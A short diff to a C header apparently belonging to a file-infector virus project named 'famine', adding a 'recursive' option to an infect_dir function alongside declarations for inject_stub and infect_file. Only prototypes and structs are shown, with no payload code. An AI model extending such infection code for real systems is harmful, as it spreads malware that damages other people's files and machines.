@@ -51,6 +51,11 @@ extern unsigned char	stub_bin[];
 extern unsigned int		stub_bin_len;
 #endif
 
+typedef struct s_args
+{
+	bool recursive;
+} t_args;
+
 typedef struct s_famine
 {
 	void	*out; // writable output image
@@ -78,6 +83,6 @@ void		inject_stub(t_famine *f, const unsigned char *stub, size_t stub_len, size_
 
 int			infect_file(const char *path, const unsigned char *stub, size_t stub_len, size_t placeholders_offset);
 
-void		infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, size_t placeholders_offset);
+void		infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, size_t placeholders_offset, bool recursive);
 
 #endif
